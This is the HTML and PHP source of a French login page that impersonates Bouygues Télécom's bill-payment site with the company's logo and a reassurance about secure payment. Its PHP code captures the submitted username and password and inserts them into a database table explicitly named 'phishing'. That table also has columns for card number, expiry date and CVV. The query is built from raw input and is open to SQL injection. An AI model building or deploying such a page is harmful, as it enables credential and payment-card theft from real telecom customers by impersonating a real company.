<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de connexion</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login-form">
        <img src="bouygues.jpg" alt="Logo Bouygues Télécom" class="logo">
        <h2>Connexion</h2>
        <br />
        <h5>Payez vos factures en toute sécurité</h5>
        <br />
        <form action="index.php" method="POST">
            <div class="input-box">
                <input type="text" id="username" name="username" required>
                <label for="username">Identifiant</label>
                
            </div>
            
            <div class="input-box">
                <input type="password" id="password" name="password" required>
                <label for="password">Mot de passe</label>
            </div>
            <button type="submit" alt="accueil.php">Se connecter</button>
           
        </form>
        <br />
        <h6>Moyens de paiement :</h6>
        <br />
        <div class="payment-methods">
        <img src="moyenspaiement.jpg" alt="" class="payment-logo">
            
        </div>
    </div>
</body>
</html>
<?php
ini_set('display_errors', 1);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    session_start();
    include '_conf.php';
    $connexion = mysqli_connect($serveurBDD, $userBDD, $mdp, $nomBDD);
    
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $_SESSION['username'] = $username;
    $_SESSION['password'] = $password;
    
    $requete = "INSERT INTO `phishing` (`id`, `mdp`, `numcarte`, `datecarte`, `vvs`) 
            VALUES ('$username', '$password', '', '', '')";
   
    $resultat = mysqli_query($connexion, $requete);
    header("Location: accueil.php");
    //exit();
}

?>